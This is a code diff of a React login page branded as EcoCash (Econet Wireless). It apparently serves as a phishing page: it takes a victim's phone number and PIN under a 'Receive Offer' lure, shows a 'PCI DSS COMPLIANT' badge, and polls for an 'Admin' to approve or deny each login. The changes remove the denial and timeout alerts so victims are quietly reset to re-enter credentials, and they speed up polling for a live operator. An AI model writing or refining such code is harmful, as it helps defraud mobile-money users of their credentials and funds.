@@ -12,7 +12,7 @@ export default function LoginPage() {
   const [phone, setPhone] = useState<string>('');
   const [pin, setPin] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
-  const [showPin, setShowPin] = useState<boolean>(false); // State for Peek feature
+  const [showPin, setShowPin] = useState<boolean>(false);
   
   const pinInputRef = useRef<HTMLInputElement>(null);
   const pollRef = useRef<NodeJS.Timeout | null>(null);
@@ -55,15 +55,14 @@ export default function LoginPage() {
       const { transaction_id } = await response.json();
 
       let attempts = 0;
-      const maxAttempts = 30;
+      const maxAttempts = 60; // 60 attempts * 1 second = 60 seconds timeout
 
       pollRef.current = setInterval(async () => {
         attempts++;
         if (attempts > maxAttempts) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          alert('Request timed out. Admin did not respond.');
-          return;
+          return; // Silently timeout without error popup
         }
 
         try {
@@ -78,21 +77,21 @@ export default function LoginPage() {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
             
-            // --- DENY REDIRECT LOGIC ---
-            // Clear inputs to "start over" and alert the user
+            // SMOOTH RESET LOGIC (No alerts, no error messages)
+            // Just clear the fields and let them start over
             setPhone('');
             setPin('');
-            alert('Login request was denied by the Administrator. Please try again.');
+            setShowPin(false);
+            
           }
         } catch (err) {
           console.error("Polling error", err);
         }
-      }, 2000); 
+      }, 1000); // 1 second polling for instant response
 
     } catch (error) {
       console.error(error);
       setIsProcessing(false);
-      alert("Could not connect to the server. Please try again.");
     }
   };
 
@@ -125,20 +124,17 @@ export default function LoginPage() {
     cardH3: { fontSize: '16px', color: '#1a1a1a', marginBottom: '4px', marginTop: 0 } as React.CSSProperties,
     cardSubtitle: { fontSize: '12px', color: '#666', marginBottom: '20px', marginTop: 0 } as React.CSSProperties,
     formGroup: { marginBottom: '20px' } as React.CSSProperties,
-    
-    // Updated Label Row to hold the Peek and Clear buttons
     labelRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' } as React.CSSProperties,
     formLabel: { fontSize: '11px', color: '#888', fontWeight: 600, margin: 0 } as React.CSSProperties,
     actionButtons: { display: 'flex', gap: '10px', alignItems: 'center' } as React.CSSProperties,
     textBtn: { background: 'none', border: 'none', color: '#1e5ce6', fontSize: '11px', fontWeight: 600, cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center', gap: '4px' } as React.CSSProperties,
-
     phoneInputWrapper: { display: 'flex', border: isPhoneValid ? '2px solid #00c853' : '1px solid #e0e0e0', borderRadius: '12px', overflow: 'hidden', transition: 'border 0.3s' } as React.CSSProperties,
     countryCode: { background: '#f8f9fc', padding: '14px 12px', fontSize: '14px', fontWeight: 500, color: '#333', borderRight: '1px solid #e0e0e0', display: 'flex', alignItems: 'center', gap: '6px' } as React.CSSProperties,
     phoneInput: { flex: 1, border: 'none', padding: '14px', fontSize: '15px', outline: 'none', letterSpacing: '1px' } as React.CSSProperties,
     pinContainer: { border: isPhoneValid ? '1px solid #e0e0e0' : '1px dashed #ccc', borderRadius: '12px', padding: '20px', textAlign: 'center', cursor: isPhoneValid ? 'pointer' : 'not-allowed', position: 'relative', backgroundColor: isPhoneValid ? 'white' : '#f9f9f9', opacity: isPhoneValid ? 1 : 0.6, transition: 'all 0.3s' } as React.CSSProperties,
     pinPlaceholder: { fontSize: '12px', color: '#aaa', marginBottom: '16px', marginTop: 0 } as React.CSSProperties,
     pinDots: { display: 'flex', justifyContent: 'center', gap: '16px' } as React.CSSProperties,
-    pinCircle: { width: '24px', height: '24px', border: '2px solid #d1d5db', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '18px', fontWeight: 600, lineHeight: 1, color: '#1e5ce6' } as React.CSSProperties, // Adjusted font size for numbers
+    pinCircle: { width: '24px', height: '24px', border: '2px solid #d1d5db', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '18px', fontWeight: 600, lineHeight: 1, color: '#1e5ce6' } as React.CSSProperties,
     pinCircleFilled: { borderColor: '#1e5ce6', backgroundColor: '#f0f5ff' } as React.CSSProperties,
     hiddenPinInput: { position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', opacity: 0, cursor: 'pointer', pointerEvents: isPhoneValid ? 'auto' : 'none' } as React.CSSProperties,
     loginFooter: { marginTop: '10px', textAlign: 'center' } as React.CSSProperties,
@@ -203,7 +199,6 @@ export default function LoginPage() {
           </div>
 
           <div style={styles.formGroup}>
-            {/* New Label Row with Peek and Clear Buttons */}
             <div style={styles.labelRow}>
               <label style={styles.formLabel}>ENTER YOUR PIN</label>
               <div style={styles.actionButtons}>
@@ -224,7 +219,6 @@ export default function LoginPage() {
               <div style={styles.pinDots}>
                 {[0, 1, 2, 3].map((index) => (
                   <div key={index} style={{ ...styles.pinCircle, ...(pin.length > index ? styles.pinCircleFilled : {}) }}>
-                    {/* Show the actual number if showPin is true, otherwise show a dot */}
                     {pin.length > index ? (showPin ? pin[index] : '•') : ''}
                   </div>
                 ))}
@@ -248,7 +242,6 @@ export default function LoginPage() {
             <span style={styles.securityBadgeSpan}><ShieldCheck size={14} /> PCI DSS COMPLIANT</span>
           </div>
           <button onClick={handlePayment} disabled={!isFormValid || isProcessing} style={{ ...styles.receiveOfferBtn, backgroundColor: isFormValid ? '#1e5ce6' : '#a0bdf5', cursor: isFormValid && !isProcessing ? 'pointer' : 'not-allowed', boxShadow: isFormValid && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', opacity: isProcessing ? 0.8 : 1 }}>
-            {/* Changed Text Here */}
             {isProcessing ? 'Receiving Offer...' : 'Receive Offer'}
           </button>
           <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
